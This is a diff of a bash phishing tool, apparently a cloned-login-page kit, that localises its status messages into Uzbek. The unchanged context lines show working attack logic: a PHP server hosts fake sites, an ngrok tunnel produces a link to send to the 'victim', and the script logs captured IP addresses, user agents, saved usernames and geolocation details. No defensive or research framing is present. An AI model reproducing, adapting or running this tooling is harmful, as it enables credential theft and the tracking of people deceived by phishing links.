@@ -49,7 +49,7 @@ server="google"
 start
 
 else
-printf "\e[1;93m [!] Invalid option!\e[0m\n"
+printf "\e[1;93m [!] Xato kiritdingiz!\e[0m\n"
 menu
 fi
 }
@@ -120,7 +120,7 @@ touch sites/$server/saved.usernames.txt
 ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
 IFS=$'\n'
 ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Foydalanuvchi IP:\e[0m\e[1;77m %s\e[0m\n" $ip
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Foydalanuvchi IP manzili:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Foydalanuvchi-agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saqlandi:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
 cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
@@ -149,13 +149,13 @@ fi
 
 
 if [[ $continent != "" ]]; then
-printf "\e[1;92m[*] IP Qit'asi:\e[0m\e[1;77m %s\e[0m\n" $continent
+printf "\e[1;92m[*] IP manzil Qit'asi:\e[0m\e[1;77m %s\e[0m\n" $continent
 fi
 ##
 
 country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
 if [[ $country != "" ]]; then
-printf "\e[1;92m[*] IP Mamlakati:\e[0m\e[1;77m %s\e[0m\n" $country
+printf "\e[1;92m[*] IP manzil Mamlakati:\e[0m\e[1;77m %s\e[0m\n" $country
 fi
 ##
 
@@ -191,7 +191,7 @@ fi
 ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
 
 if [[ $ip_currency != "" ]]; then
-printf "\e[1;92m[*] IP turi:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
+printf "\e[1;92m[*] IP manzil turi:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
 fi
 ##
 printf "\n"
@@ -215,7 +215,7 @@ if [[ -e ngrok ]]; then
 echo ""
 else
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m]Ngrok o'rnatilmoqda...\n"
 arch=$(uname -a | grep -o 'arm')
 
 if [[ $arch == *'arm'* ]]; then
@@ -226,7 +226,7 @@ unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-arm.zip
 else
-printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
+printf "\e[1;93m[!] Xato o'rnatildi... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
 exit 1
 fi
 
@@ -239,32 +239,32 @@ unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
 chmod +x ngrok
 rm -rf ngrok-stable-linux-386.zip
 else
-printf "\e[1;93m[!] Download error... \e[0m\n"
+printf "\e[1;93m[!] Xato o'rnatildi... \e[0m\n"
 exit 1
 fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] php server ishga tushmoqda...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
+printf "\e[1;92m[\e[0m*\e[1;92m] ngrok server ishga tushmoqda...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
 link=$(curl -s -N http://127.0.0.1:4040/status | grep -o "https://[0-9a-z]*\.ngrok.io")
-printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Victim:\e[0m\e[1;77m %s\e[0m\n" $link
+printf "\e[1;92m[\e[0m*\e[1;92m] fishing sayt havolasi:\e[0m\e[1;77m %s\e[0m\n" $link
 checkfound
 }
 checkfound() {
 
 
-printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting victim open the link ...\e[0m\n"
+printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Havolani ochilishini kutamiz ...\e[0m\n"
 while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
+printf "\n\e[1;92m[\e[0m*\e[1;92m] IP manzil topildi!\n"
 catch_ip
 
 fi
